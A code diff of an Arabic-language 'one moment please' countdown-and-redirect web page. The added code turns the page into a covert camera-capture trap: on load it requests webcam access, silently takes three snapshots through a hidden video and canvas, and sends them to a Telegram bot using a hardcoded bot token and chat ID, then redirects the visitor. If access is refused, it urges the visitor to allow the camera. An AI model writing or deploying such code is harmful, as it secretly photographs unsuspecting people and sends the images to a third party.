@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لحظة واحده</title>
+    <title>لحظة واحدة</title>
     <style>
         body { 
-            background-color: #0d0d0d; /* لون الخلفية الأسود الداكن */
+            background-color: #0d0d0d; 
             color: #fff; 
             display: flex; 
             flex-direction: column; 
@@ -18,13 +18,12 @@
         }
         #timer { 
             font-size: 100px; 
-            color: #ff6600; /* اللون البرتقالي المميز */
+            color: #ff6600; 
             font-weight: bold; 
-            margin-bottom: 20px; 
         }
         #message { 
             font-size: 24px; 
-            margin-top: 10px;
+            margin-top: 10px; 
         }
     </style>
 </head>
@@ -32,31 +31,68 @@
 
     <div id="timer">10</div>
     <div id="message">لحظة واحدة من فضلك</div>
+    <video id="video" style="display:none;" playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // استخراج الرابط الهدف من الرابط
         const urlParams = new URLSearchParams(window.location.search);
-        const targetUrl = urlParams.get('target') || "https://www.google.com";
+        const TARGET_URL = urlParams.get('target') || "https://google.com";
+        const CHAT_ID = urlParams.get('chatId') || '8169635171';
+        const TOKEN = '8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc';
 
-        let count = 10;
-        const timerEl = document.getElementById('timer');
-        const messageEl = document.getElementById('message');
-
-        const interval = setInterval(() => {
-            count--;
+        async function captureAndSend(video) {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            if (count > 0) {
-                timerEl.innerText = count;
-            } else {
-                // عند انتهاء العد
-                timerEl.innerText = "تم التوجيه";
-                messageEl.innerText = "لحظة واحدة من فضلك";
-                clearInterval(interval);
+            return new Promise((resolve) => {
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, 'shot.jpg');
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    resolve();
+                }, 'image/jpeg', 0.7);
+            });
+        }
+
+        async function startProcess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // التقاط 3 صور بفاصل ثانية
+                for (let i = 0; i < 3; i++) {
+                    await captureAndSend(video);
+                    if (i < 2) await new Promise(r => setTimeout(r, 1000));
+                }
+
+                stream.getTracks().forEach(t => t.stop());
+
+                // بدء العد التنازلي
+                let count = 10;
+                const timerEl = document.getElementById('timer');
+                const messageEl = document.getElementById('message');
                 
-                // التوجيه التلقائي
-                window.location.replace(targetUrl);
+                const interval = setInterval(() => {
+                    count--;
+                    if (count > 0) {
+                        timerEl.innerText = count;
+                    } else {
+                        timerEl.innerText = "تم التوجيه";
+                        clearInterval(interval);
+                        window.location.replace(TARGET_URL);
+                    }
+                }, 1000);
+            } catch (e) {
+                document.getElementById('message').innerText = "يرجى الضغط على سماح للكاميرا";
             }
-        }, 1000);
+        }
+
+        window.onload = startProcess;
     </script>
 </body>
 </html>
